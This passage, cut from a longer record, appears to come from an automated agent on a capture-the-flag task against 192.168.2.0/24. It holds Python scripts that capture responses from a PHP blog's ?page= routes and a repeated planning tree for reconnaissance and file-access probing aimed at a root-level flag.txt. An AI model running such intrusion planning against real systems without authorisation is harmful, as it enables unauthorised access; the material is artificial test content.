            record["response_body_encoding"] = "UTF-8"
        except UnicodeDecodeError:
            record["response_body_encoding"] = "non-UTF-8; exact bytes preserved in base64"
        record["response_body_length_bytes"] = len(body)
    except Exception as exc:
        record["capture_limitation"] = "Response status received, but reading the complete response body failed: {}: {}".format(type(exc).__name__, exc)
except Exception as exc:
    record["capture_limitation"] = "Request or response capture failed: {}: {}".format(type(exc).__name__, exc)
finally:
    connection.close()

print(json.dumps(record, ensure_ascii=True))

import base64
import json
import urllib.error
import urllib.request

url = "http://192.168.2.0/index.php"
record = {
    "request_url": url,
    "method": "GET",
    "http_status": None,
    "final_url": None,
    "response_body_bytes_base64": None,
    "response_body_text_utf8_replacement": None,
    "response_body_length_bytes": None,
    "capture_limitation": None,
}

request = urllib.request.Request(url, method="GET")
try:
    try:
        response = urllib.request.urlopen(request, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        record["http_status"] = response.status
        record["final_url"] = response.geturl()
        body = response.read()
        record["response_body_bytes_base64"] = base64.b64encode(body).decode("ascii")
        record["response_body_text_utf8_replacement"] = body.decode("utf-8", errors="replace")
        record["response_body_length_bytes"] = len(body)
except Exception as error:
    record["capture_limitation"] = {
        "stage": "request_or_body_capture",
        "error_type": type(error).__name__,
        "message": str(error),
        "http_status_unavailable": record["http_status"] is None,
        "body_unavailable_or_incomplete": record["response_body_bytes_base64"] is None,
    }

print(json.dumps(record, ensure_ascii=False))

import base64
import json
import urllib.error
import urllib.request

URL = "http://192.168.2.0/index.php?page=page1.php"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

record = {"request_url": URL, "method": "GET"}
opener = urllib.request.build_opener(NoRedirect)
try:
    response = opener.open(urllib.request.Request(URL, method="GET"), timeout=20)
except urllib.error.HTTPError as exc:
    # HTTPError represents an HTTP response (including redirects when not followed).
    response = exc
except (urllib.error.URLError, TimeoutError, OSError) as exc:
    record["http_status"] = None
    record["response_body"] = None
    record["capture_limitation"] = f"No complete HTTP response captured: {type(exc).__name__}: {exc}"
else:
    pass

if "capture_limitation" not in record:
    try:
        body = response.read()
        record["http_status"] = response.getcode()
        record["response_body_bytes_base64"] = base64.b64encode(body).decode("ascii")
        record["response_body_length_bytes"] = len(body)
        try:
            record["response_body"] = body.decode("utf-8")
            record["response_body_encoding"] = "UTF-8"
        except UnicodeDecodeError:
            record["response_body"] = None
            record["response_body_encoding"] = "non-UTF-8; exact bytes are in base64"
        record["capture_limitation"] = None
    except (OSError, TimeoutError) as exc:
        record["http_status"] = response.getcode()
        record["response_body"] = None
        record["capture_limitation"] = f"HTTP status received, but response body capture failed: {type(exc).__name__}: {exc}"
    finally:
        response.close()

print(json.dumps(record, ensure_ascii=True))

import base64
import json
import urllib.error
import urllib.request

URL = "http://192.168.2.0/index.php?page=page2.php"
record = {"request_url": URL, "method": "GET"}
request = urllib.request.Request(URL, method="GET")
try:
    with urllib.request.urlopen(request, timeout=20) as response:
        body = response.read()
        record.update({
            "http_status": response.status,
            "response_body_bytes_base64": base64.b64encode(body).decode("ascii"),
            "response_body_encoding": "UTF-8 with replacement for invalid sequences",
            "response_body": body.decode("utf-8", errors="replace"),
            "capture_limitation": None,
        })
except urllib.error.HTTPError as error:
    body = error.read()
    record.update({
        "http_status": error.code,
        "response_body_bytes_base64": base64.b64encode(body).decode("ascii"),
        "response_body_encoding": "UTF-8 with replacement for invalid sequences",
        "response_body": body.decode("utf-8", errors="replace"),
        "capture_limitation": None,
    })
except Exception as error:
    record.update({
        "http_status": None,
        "response_body": None,
        "response_body_bytes_base64": None,
        "capture_limitation": f"Request/capture failed: {type(error).__name__}: {error}",
    })
print(json.dumps(record, ensure_ascii=True))

import base64
import json
import urllib.error
import urllib.request

URL = "http://192.168.2.0/index.php?page=page3.php"

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

record = {
    "request_url": URL,
    "method": "GET",
    "http_status": None,
    "response_body_bytes_base64": None,
    "response_body_text": None,
    "response_body_text_encoding": None,
    "final_url": None,
    "response_headers": None,
    "capture_limitation": None,
}

opener = urllib.request.build_opener(NoRedirectHandler)
request = urllib.request.Request(URL, method="GET")
try:
    response = opener.open(request, timeout=20)
except urllib.error.HTTPError as exc:
    # HTTPError is also the response object for non-2xx statuses and redirects.
    record["http_status"] = exc.code
    record["final_url"] = exc.geturl()
    record["response_headers"] = list(exc.headers.items()) if exc.headers else []
    body = exc.read()
except (urllib.error.URLError, TimeoutError, OSError) as exc:
    record["capture_limitation"] = "No HTTP response was captured: {}: {}".format(
        type(exc).__name__, exc
    )
else:
    with response:
        record["http_status"] = response.status
        record["final_url"] = response.geturl()
        record["response_headers"] = list(response.headers.items())
        body = response.read()

if record["http_status"] is not None:
    record["response_body_bytes_base64"] = base64.b64encode(body).decode("ascii")
    try:
        record["response_body_text"] = body.decode("utf-8", errors="strict")
        record["response_body_text_encoding"] = "utf-8"
    except UnicodeDecodeError:
        record["response_body_text"] = None
        record["response_body_text_encoding"] = None
        record["capture_limitation"] = (
            "Response body bytes were captured exactly; the body is not valid UTF-8, "
            "so only the exact base64 representation is provided."
        )

print(json.dumps(record, ensure_ascii=False))

nodes.expected_observation: Responsive hosts and service metadata may identify one or more candidates; alternatively, no candidates may be observed or the discovery evidence may be incomplete.
nodes.goal: Within the task-provided 192.168.2.0/24 scope, discover responsive hosts and observe their exposed services. The target identity and hosted service are unknown inputs; use the task scope as the discovery source.
nodes.stop_condition: Finish when the in-scope discovery results and their coverage limitations are recorded.
nodes.success_criteria: Record the observed responsive endpoints and service evidence, or establish that this discovery produced no usable candidate evidence.

nodes.expected_observation: The evidence may support one or more candidate endpoints, or may be too sparse or ambiguous to identify a candidate.
nodes.goal: Assess the initial in-scope host and service observations to determine whether there are candidate endpoints worth investigating as the target.
nodes.stop_condition: Finish when candidate evidence is sufficient to proceed or the need for further in-scope discovery is established.
nodes.success_criteria: Determine from observed endpoint and service evidence whether at least one candidate can be investigated without asserting an unverified target identity.

nodes.expected_observation: Additional candidate endpoints or service evidence may be found; alternatively, this discovery may yield no usable candidate evidence or remain incomplete.
nodes.goal: Use the initial discovery findings and observed network context to pursue additional in-scope discovery of responsive hosts and hosted services in 192.168.2.0/24. Do not treat an earlier negative or incomplete result as proof that no target exists.
nodes.stop_condition: Finish when follow-up discovery has produced candidate evidence or its available findings and limitations are recorded.
nodes.success_criteria: Record any newly observed candidate endpoints and service evidence, or document that follow-up discovery did not produce usable candidates and why.

nodes.expected_observation: Follow-up evidence may support one or more candidates, or may remain insufficient to identify a candidate.
nodes.goal: Assess the follow-up discovery evidence to decide whether observed endpoints or services provide a reasonable basis for investigating the hosted target.
nodes.stop_condition: Finish when the follow-up evidence supports further service investigation or remains insufficient.
nodes.success_criteria: Determine whether observed candidate endpoints can be investigated further, while preserving uncertainty about target identity where evidence is inconclusive.

nodes.expected_observation: Service interaction may identify a viable access path and evidence linking a candidate to the target; it may instead reveal further service leads, or fail to provide a usable path.
nodes.goal: Interact with the observed hosted service or services on the candidate endpoint or endpoints within 192.168.2.0/24. Use their observed behavior to identify a relevant access path toward the target system's root-level flag.txt file.
nodes.stop_condition: Finish when a viable access lead is documented or the findings indicate that another service-focused investigation is warranted.
nodes.success_criteria: Record service responses and determine whether they provide a supported access path to investigate, distinguishing observed evidence from hypotheses.

nodes.expected_observation: Alternative service evidence may establish an access path; it may also leave the path unresolved.
nodes.goal: Use the accumulated candidate and service observations to investigate other relevant, evidence-supported ways to interact with the hosted service and reach the target system, remaining within 192.168.2.0/24.
nodes.stop_condition: Finish when an alternative access path is identified or the available service evidence remains insufficient to support one.
nodes.success_criteria: Record whether an alternative, evidence-supported access path is available and the observations supporting that conclusion.

nodes.expected_observation: The root-level file may be readable and its contents verifiable, or access may fail or produce incomplete evidence.
nodes.goal: Using the established service-based access path, access and verify the contents of flag.txt in the root directory of the identified target system.
nodes.stop_condition: Finish when the file contents and path are verified, or when the observed access result warrants investigation of an alternative access path.
nodes.success_criteria: Obtain evidence that the observed file is flag.txt in the target system's root directory and capture its contents; a successful connection or session alone is insufficient.

nodes.expected_observation: An alternative path may become supportable, or available evidence may remain insufficient to access and verify the file.
nodes.goal: Based on the failed or incomplete initial file-access evidence, investigate other supported access paths arising from the observed target and service evidence, without expanding the target scope.
nodes.stop_condition: Finish when an alternative access path is ready for file verification or the investigation remains inconclusive.
nodes.success_criteria: Record a distinct, evidence-supported alternative access path if found, or document why the observed evidence does not support one.

nodes.expected_observation: The alternative path may provide verifiable file contents, or access may remain unsuccessful or incomplete.
nodes.goal: Use the alternative access path to access and verify flag.txt in the root directory of the identified target system.
nodes.stop_condition: Finish when the file contents and path are verified or the alternative access attempt leaves the task objective unresolved.
nodes.success_criteria: Obtain evidence that the observed file is flag.txt in the target system's root directory and capture its contents.

nodes.expected_observation: Verified file contents and evidence identifying the target and root-level file.
nodes.goal: Mark completion only when evidence verifies the contents of flag.txt at the root directory of the target system.
nodes.stop_condition: End this path after recording the verified task result.
nodes.success_criteria: The required root-level flag.txt contents have been observed and verified.

nodes.expected_observation: Discovery, service, or access evidence remains absent, incomplete, or inconclusive.
nodes.goal: Record that available in-scope evidence does not establish the target or verify access to its root-level flag.txt.
nodes.stop_condition: End this path after recording the unresolved evidence and its limitations.
nodes.success_criteria: Preserve the observed findings and state that the task objective is unresolved, without treating a negative result from one investigation as proof that all alternatives are unavailable.

nodes.expected_observation: The PHP source-display check may reveal source that supports a specific access path, return ordinary application content or an unavailable response, or provide incomplete evidence.
nodes.goal: Check whether the observed PHP blog at 192.168.2.0 exposes source for its observed index.php entry point or advertised PHP pages through a PHP source-display handler. If source is exposed, assess whether it establishes a concrete, service-supported route toward verifying the target system's root-level flag.txt.
nodes.stop_condition: Finish after checking the observed PHP entry point and advertised PHP pages and assessing whether the responses support an alternative path to file verification.
nodes.success_criteria: Record the exact in-scope PHP resource checked and its response; identify an access path only if the response evidence supports one. Do not treat source-handler unavailability or an ordinary response as proof that other access methods are unavailable.

nodes.expected_observation: UDP discovery may identify services for targeted interaction, find no usable service evidence, or produce incomplete or ambiguous results.
nodes.goal: Investigate whether the observed responsive candidate at 192.168.2.0 exposes UDP services that provide a distinct route toward accessing the target system's root-level flag.txt. Keep discovery within the task-provided 192.168.2.0/24 scope; the prior reported full scan covered TCP, and does not establish UDP coverage.
nodes.stop_condition: Finish when the UDP discovery results and their coverage limitations are recorded.
nodes.success_criteria: Record the UDP coverage, observed port states and any service-identification evidence. Do not treat lack of a UDP response as proof that the endpoint or other access methods are unavailable.

nodes.expected_observation: The results may support interaction with an identified UDP service, or may provide no usable service lead or remain incomplete.
nodes.goal: Assess the UDP discovery results to determine whether they identify a service suitable for targeted interaction toward verifying the root-level flag.txt.
nodes.stop_condition: Finish when the UDP evidence supports a targeted interaction or this discovery path provides no usable lead.
nodes.success_criteria: Select targeted interaction only when the observed UDP evidence supports it; otherwise preserve the discovery coverage and uncertainty without asserting that other methods are exhausted.

nodes.expected_observation: Protocol interaction may establish a concrete file-verification path, provide responses without such a path, or yield incomplete evidence.
nodes.goal: Interact with the UDP service or services identified on 192.168.2.0, using their observed protocol or service evidence to determine whether they support a concrete path to verify the target system's root-level flag.txt. Do not assume the candidate's identity or infer access from a service response alone.
nodes.stop_condition: Finish after the identified UDP service has been investigated enough to determine whether its observed responses establish a file-verification path.
nodes.success_criteria: Record the exact service interaction and responses; use the alternative file-access path only if evidence establishes a concrete route for verification.

nodes.expected_observation: The homepage and advertised routes may reveal a supported file-verification path or provide no such lead.
nodes.goal: Inspect the homepage of the observed HTTP/PHP application at 192.168.2.0, recording its links, forms, and referenced resources. Follow advertised PHP routes that have not already been checked, and look for evidence of a concrete way to verify the target's root-level flag.txt. Do not repeat previously tested direct-file, path-resolution, wrapper, or source-display probes.
nodes.stop_condition: Finish after inspecting the homepage and its advertised routes sufficiently to assess whether they provide a concrete file-verification lead.
nodes.success_criteria: Record the homepage, advertised routes followed, and exact responses. Identify a file-access path only when the observations support it.

nodes.expected_observation: The observations may establish a supported file-verification path or remain insufficient to support one.
nodes.goal: Assess the observed homepage links, forms, referenced resources, and route responses to determine whether they establish a concrete path to verify the target system's root-level flag.txt.
nodes.stop_condition: Finish when the route evidence supports file verification or this inspection produces no supported lead.
nodes.success_criteria: Proceed to file verification only if the observed application evidence supports a concrete path; otherwise preserve the findings and continue with distinct, evidence-supported HTTP discovery.

nodes.expected_observation: The metadata files or referenced resources may identify further useful routes, or provide no supported lead.
nodes.goal: If the homepage and its advertised routes provide no file-verification lead, check the observed web application's robots.txt and sitemap.xml, and inspect resources they identify for additional relevant routes. Stay within the observed in-scope HTTP service and do not repeat previously tested file-access probes.
nodes.stop_condition: Finish after checking the metadata resources and any relevant routes they identify.
nodes.success_criteria: Record which metadata resources were available and any routes or relevant resources they identify; treat absence or lack of useful leads as limited to these checks.

nodes.expected_observation: The observations may support a concrete file-verification path or remain insufficient.
nodes.goal: Assess the robots.txt, sitemap.xml, and any referenced-resource observations to determine whether they establish a concrete path to verify the target system's root-level flag.txt.
nodes.stop_condition: Finish when the metadata evidence supports file verification or provides no supported lead.
nodes.success_criteria: Continue to file verification only when the observed evidence supports a concrete path; otherwise record the limited findings without claiming that other methods are exhausted.

nodes.expected_observation: The checked routes and metadata provide no supported file-verification path.
nodes.goal: Record that the inspected homepage routes and web discovery metadata did not establish a way to verify the target's root-level flag.txt.
nodes.stop_condition: End this investigation path after recording its findings and limitations.
nodes.success_criteria: Record the checks and their limitations as an unresolved result for this investigation path; do not assert that all in-scope access methods are unavailable.

nodes.expected_observation: The homepage may advertise routes that can be checked individually, or it may provide no routes. Separate captures may make response details assessable, or a response may remain unavailable or incomplete.
nodes.goal: Obtain verifiable records of the observed HTTP application's homepage and any advertised same-origin routes. Capture each response separately in a compact form that preserves the request URL, HTTP status, and exact response content needed to assess route behavior. Do not repeat previously tested file-access probes.
nodes.stop_condition: Finish after the homepage and any advertised routes have separate, assessable response records, or their capture limitations are documented.
nodes.success_criteria: Provide assessable records of the homepage and each advertised route checked, including request URL, response status, and exact response content; distinguish unavailable or incomplete captures from confirmed responses.

nodes.stop_condition: Finish after resolving the origin or documenting why the available observations and focused discovery did not resolve it.
nodes.success_criteria: The service origin is identified from observed evidence and recorded for the metadata checks; otherwise, record the unresolved endpoint and the evidence examined.

nodes.expected_observation: Response status and content for each metadata resource; any sitemap locations, relevant routes, or other relevant resources identified and inspected; or limitations preventing those checks.
nodes.goal: Using the resolved origin of the observed in-scope HTTP service, request robots.txt and sitemap.xml. Record each response and inspect relevant routes or resources identified by either file, without repeating previously tested file-access probes.
nodes.stop_condition: Finish after both metadata resources have been checked and any relevant resources they identify have been inspected, or after recording a concrete limitation that prevented completing those checks.
nodes.success_criteria: Record which metadata resources were available and the routes or relevant resources they identify, including the results of inspecting those resources. A missing file or no useful lead is a finding limited to these checks.

nodes.expected_observation: Evidence records the requests, availability or absence of robots.txt and sitemap.xml, and results for relevant resources identified by them.
nodes.goal: Record the local outcome that the requested metadata checks and inspection of relevant identified resources were completed.
nodes.stop_condition: Stop this path after recording the completed local outcome; this does not establish task-wide success or rule out other access methods.
nodes.success_criteria: The parent objective's metadata-check evidence is recorded, whether or not the checks reveal a useful file-verification lead.

nodes.expected_observation: Incomplete, unavailable, or otherwise insufficient response evidence, with the specific limitation recorded.
nodes.goal: Record that evidence from the metadata checks is insufficient to establish which resources were available or what relevant resources they identified.
nodes.stop_condition: Stop this path after recording the local unresolved outcome.
nodes.success_criteria: The remaining uncertainty and its evidence limitations are recorded without treating them as proof that other methods are unavailable.

nodes.stop_condition: Finish when the file contents and path are verified or the alternative access attempt leaves the task objective unresolved.
nodes.success_criteria: Obtain evidence that the observed file is flag.txt in the target system's root directory and capture its contents.

nodes.expected_observation: Verified file contents and evidence identifying the target and root-level file.
nodes.goal: Mark completion only when evidence verifies the contents of flag.txt at the root directory of the target system.
nodes.stop_condition: End this path after recording the verified task result.
nodes.success_criteria: The required root-level flag.txt contents have been observed and verified.

nodes.expected_observation: Discovery, service, or access evidence remains absent, incomplete, or inconclusive.
nodes.goal: Record that available in-scope evidence does not establish the target or verify access to its root-level flag.txt.
nodes.stop_condition: End this path after recording the unresolved evidence and its limitations.
nodes.success_criteria: Preserve the observed findings and state that the task objective is unresolved, without treating a negative result from one investigation as proof that all alternatives are unavailable.

nodes.expected_observation: The PHP source-display check may reveal source that supports a specific access path, return ordinary application content or an unavailable response, or provide incomplete evidence.
nodes.goal: Check whether the observed PHP blog at 192.168.2.0 exposes source for its observed index.php entry point or advertised PHP pages through a PHP source-display handler. If source is exposed, assess whether it establishes a concrete, service-supported route toward verifying the target system's root-level flag.txt.
nodes.stop_condition: Finish after checking the observed PHP entry point and advertised PHP pages and assessing whether the responses support an alternative path to file verification.
nodes.success_criteria: Record the exact in-scope PHP resource checked and its response; identify an access path only if the response evidence supports one. Do not treat source-handler unavailability or an ordinary response as proof that other access methods are unavailable.

nodes.expected_observation: UDP discovery may identify services for targeted interaction, find no usable service evidence, or produce incomplete or ambiguous results.
nodes.goal: Investigate whether the observed responsive candidate at 192.168.2.0 exposes UDP services that provide a distinct route toward accessing the target system's root-level flag.txt. Keep discovery within the task-provided 192.168.2.0/24 scope; the prior reported full scan covered TCP, and does not establish UDP coverage.
nodes.stop_condition: Finish when the UDP discovery results and their coverage limitations are recorded.
nodes.success_criteria: Record the UDP coverage, observed port states and any service-identification evidence. Do not treat lack of a UDP response as proof that the endpoint or other access methods are unavailable.

nodes.expected_observation: The results may support interaction with an identified UDP service, or may provide no usable service lead or remain incomplete.
nodes.goal: Assess the UDP discovery results to determine whether they identify a service suitable for targeted interaction toward verifying the root-level flag.txt.
nodes.stop_condition: Finish when the UDP evidence supports a targeted interaction or this discovery path provides no usable lead.
nodes.success_criteria: Select targeted interaction only when the observed UDP evidence supports it; otherwise preserve the discovery coverage and uncertainty without asserting that other methods are exhausted.

nodes.expected_observation: Protocol interaction may establish a concrete file-verification path, provide responses without such a path, or yield incomplete evidence.
nodes.goal: Interact with the UDP service or services identified on 192.168.2.0, using their observed protocol or service evidence to determine whether they support a concrete path to verify the target system's root-level flag.txt. Do not assume the candidate's identity or infer access from a service response alone.
nodes.stop_condition: Finish after the identified UDP service has been investigated enough to determine whether its observed responses establish a file-verification path.
nodes.success_criteria: Record the exact service interaction and responses; use the alternative file-access path only if evidence establishes a concrete route for verification.

nodes.expected_observation: The homepage and advertised routes may reveal a supported file-verification path or provide no such lead.
nodes.goal: Inspect the homepage of the observed HTTP/PHP application at 192.168.2.0, recording its links, forms, and referenced resources. Follow advertised PHP routes that have not already been checked, and look for evidence of a concrete way to verify the target's root-level flag.txt. Do not repeat previously tested direct-file, path-resolution, wrapper, or source-display probes.
nodes.stop_condition: Finish after inspecting the homepage and its advertised routes sufficiently to assess whether they provide a concrete file-verification lead.
nodes.success_criteria: Record the homepage, advertised routes followed, and exact responses. Identify a file-access path only when the observations support it.

nodes.expected_observation: The observations may establish a supported file-verification path or remain insufficient to support one.
nodes.goal: Assess the observed homepage links, forms, referenced resources, and route responses to determine whether they establish a concrete path to verify the target system's root-level flag.txt.
nodes.stop_condition: Finish when the route evidence supports file verification or this inspection produces no supported lead.
nodes.success_criteria: Proceed to file verification only if the observed application evidence supports a concrete path; otherwise preserve the findings and continue with distinct, evidence-supported HTTP discovery.

nodes.expected_observation: The metadata files or referenced resources may identify further useful routes, or provide no supported lead.
nodes.goal: If the homepage and its advertised routes provide no file-verification lead, check the observed web application's robots.txt and sitemap.xml, and inspect resources they identify for additional relevant routes. Stay within the observed in-scope HTTP service and do not repeat previously tested file-access probes.
nodes.stop_condition: Finish after checking the metadata resources and any relevant routes they identify.
nodes.success_criteria: Record which metadata resources were available and any routes or relevant resources they identify; treat absence or lack of useful leads as limited to these checks.

nodes.expected_observation: The observations may support a concrete file-verification path or remain insufficient.
nodes.goal: Assess the robots.txt, sitemap.xml, and any referenced-resource observations to determine whether they establish a concrete path to verify the target system's root-level flag.txt.
nodes.stop_condition: Finish when the metadata evidence supports file verification or provides no supported lead.
nodes.success_criteria: Continue to file verification only when the observed evidence supports a concrete path; otherwise record the limited findings without claiming that other methods are exhausted.

nodes.expected_observation: The checked routes and metadata provide no supported file-verification path.
nodes.goal: Record that the inspected homepage routes and web discovery metadata did not establish a way to verify the target's root-level flag.txt.
nodes.stop_condition: End this investigation path after recording its findings and limitations.
nodes.success_criteria: Record the checks and their limitations as an unresolved result for this investigation path; do not assert that all in-scope access methods are unavailable.

nodes.expected_observation: The homepage may advertise routes that can be checked individually, or it may provide no routes. Separate captures may make response details assessable, or a response may remain unavailable or incomplete.
nodes.goal: Obtain verifiable records of the observed HTTP application's homepage and any advertised same-origin routes. Capture each response separately in a compact form that preserves the request URL, HTTP status, and exact response content needed to assess route behavior. Do not repeat previously tested file-access probes.
nodes.stop_condition: Finish after the homepage and any advertised routes have separate, assessable response records, or their capture limitations are documented.
nodes.success_criteria: Provide assessable records of the homepage and each advertised route checked, including request URL, response status, and exact response content; distinguish unavailable or incomplete captures from confirmed responses.

nodes.expected_observation: The service may expose an unadvertised resource or entry point that supports further investigation, or the checks may produce no useful lead or incomplete evidence.
nodes.goal: Investigate the observed in-scope HTTP service at 192.168.2.0 for unadvertised web resources or application entry points that could provide a distinct, evidence-supported route to verify the target system's root-level flag.txt. Avoid repeating the previously checked routes, direct-file, path-resolution, wrapper, and source-display probes.
nodes.stop_condition: Finish when the distinct resource-discovery checks and their coverage limitations are recorded.
nodes.success_criteria: Record the specific in-scope resources checked and their responses. Treat a resource as a file-verification lead only when its observed behavior supports a concrete way to verify the target's root-level flag.txt.

nodes.expected_observation: The findings may support a concrete file-verification path, or may remain insufficient or incomplete.
nodes.goal: Assess the unadvertised-resource discovery findings to determine whether they establish a concrete path to verify the target system's root-level flag.txt.
nodes.stop_condition: Finish when the findings support file verification or provide no supported lead.
nodes.success_criteria: Continue to file verification only when observed responses establish a concrete path; otherwise record this investigation path as unresolved without claiming other access methods are exhausted.

nodes.expected_observation: The checked resources provide no supported file-verification path, or the results remain incomplete.
nodes.goal: Record that the unadvertised-resource checks did not establish a way to verify the target's root-level flag.txt.
nodes.stop_condition: End this investigation path after recording its findings and limitations.
nodes.success_criteria: Preserve the specific checks and their limitations as an unresolved result for this investigation path; do not claim all in-scope access methods are unavailable.
